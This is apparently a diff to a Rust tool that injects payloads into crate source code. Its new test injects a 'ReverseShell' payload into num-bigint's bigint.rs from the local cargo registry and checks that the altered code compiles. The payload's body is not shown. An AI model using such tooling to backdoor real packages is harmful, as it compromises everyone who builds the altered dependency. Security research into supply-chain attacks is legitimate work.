@@ -47,10 +47,13 @@ use compilation::*;
 // <payload>
 // <file_selected> has to be the absolute path to the file
 fn integrate(file_selected: &String, method_starting_line: usize, payload: &dyn Payload) -> PayloadResult<String> {
-   payload.inject(
+   let injected_payload = payload.inject(
        &std::fs::read_to_string(file_selected.clone()).unwrap() 
        , &method_starting_line
-   )
+   )?;
+   let file_name = "/tmp/mock_program";
+   let _ = std::fs::File::create(&file_name).unwrap().write(&injected_payload.as_bytes()).unwrap();
+   Ok(file_name.to_string())
 }
 // returns error if compilation was not successful
 fn ok_command(comp_stat: &CompilationStatus) -> Result<(), String> {
@@ -142,6 +145,7 @@ fn main() {
                                    , target_crate
                                    , &target_file)
                                 );
+                               // delete tmp file created
                         } else {
                             error!("Method not found in specified file")
                         }
@@ -167,4 +171,22 @@ fn main() {
 
 #[cfg(test)]
 mod tests {
+
+    use super::*;
+    use std::process::Command;
+    #[test]
+    fn injects_and_compiles() {
+         // inject
+        let target_crate = "index.crates.io-6f17d22bba15001f/num-bigint-0.1.44";
+        let target_file = "src/bigint.rs";
+        let home = Command::new("/bin/bash").arg("-c").arg("echo $HOME").output().unwrap();
+        let home = String::from_utf8(home.stdout).unwrap().trim().to_string();
+        let integrate_file = home+"/.cargo/registry/src/"+&target_crate+"/"+&target_file;
+         let injected_code_file = integrate(&integrate_file, 188, &ReverseShell{}).unwrap(); 
+        if let CompilationStatus::Correct(_, _) = compile_mock_integration(&injected_code_file, target_crate, target_file) {
+            assert!(true);
+         } else {
+             assert!(false);
+         }
+    }
 }
